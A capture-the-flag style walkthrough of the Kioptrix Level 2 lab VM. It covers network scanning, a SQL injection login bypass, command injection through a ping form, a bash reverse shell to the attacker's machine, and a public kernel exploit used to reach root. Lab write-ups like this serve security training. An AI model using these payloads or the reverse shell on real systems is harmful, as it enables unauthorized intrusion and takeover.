# Kioptrix Level 2

## Setup

By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali.

To do this before opening the machine in our VMware we go to the configuration file.
![Untitled](Untitled.png)

we open it with our text editor and change the network name to NAT

![Untitled](Untitled%201.png)

```bash
#change
ethernet0.networkName = "Bridged"
#to
ethernet0.networkName = "NAT"
```

Then we open the machine from VMware and change the network interface to NAT.
![Untitled](Untitled%202.png)

We start and a series of windows will appear in which we must select "Do Nothing" in all of them until the machine finishes starting.

And we should have the machine ready to start.
## Machine Resolution

### Scanning and Vulnerability Analysis

We start with a scan with the arp command to obtain the ip of our machine.


```bash
sudo arp-scan -I eth0 --localnet
```

![Untitled](Untitled%204.png)

Once we have obtained our IP address, we will perform a scan with nmap to discover open ports.

```bash
nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.160 -oN Target
```

Output:

```bash

After a general scan, we will perform another one specifying the ports discovered to see which version of the services are running.

```bash
nmap -p22,80,111,443,631,996,3306 -sCV 192.168.66.160
```

### Explotation

After analyzing the result we see that port 80 is open with the http service, so we go to see the web.

![Untitled](Untitled%205.png)

We observe a login with Username and Password fields.

Let's try to perform a basic SQLInjection command on the Username field.

```bash
' or 1 = 1 -- -
```

And we are successful and the following window appears:

![Untitled](Untitled%206.png)

We observe that it has the function of pinging the ip that we indicate. If we write the ip of the machine we obtain the following:

![Untitled](Untitled%207.png)

We try to concatenate commands with a ";" and see that they can be concatenated:
```bash
192.168.66.160 ; whoami
```

result:

![Untitled](Untitled%208.png)

Once here, we listen to our kali and execute the following command to get a reverse Shell

```bash
#kali
nc -nlvp 4444
#En la web
192.168.66.152 ; bash -i >& /dev/tcp/192.168.66.152/4444 0>&1
```

result:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                     
listening on [any] 4444 ...
connect to [192.168.66.152] from (UNKNOWN) [192.168.66.160] 32779
bash: no job control in this shell
bash-3.00$ whoami
apache
```

### Privilege Escalation

We transfer [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases) from our Kali to the machine to see where we can escalate privileges, for this we start a server with Python in our Kali:

```bash
python3 -m http.server 80
```

and with wget from the machine we download Linpeas.

```bash
wget http://192.168.66.152/linpeas.sh
```

Once we have Linpeas on the target machine we run it and we see the following:

![Untitled](Untitled%209.png)

The machine is a CentOS 4.5 with Linux version 2.6.9.

We searched Google to see if there is a privilege escalation exploit with these characteristics and found the following exploit:

[https://www.exploit-db.com/exploits/9542](https://www.exploit-db.com/exploits/9542)

We download it to our machine and transfer it as we have done before.

Compile it

```bash
gcc 9542.c -o exploit
```

We give execution permissions

```bash
chmod +x exploit
```

and run it getting a shell as root

```bash
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# whoami
root
```

and we would have the machine finished.

Best regards and Happy Hacking :)
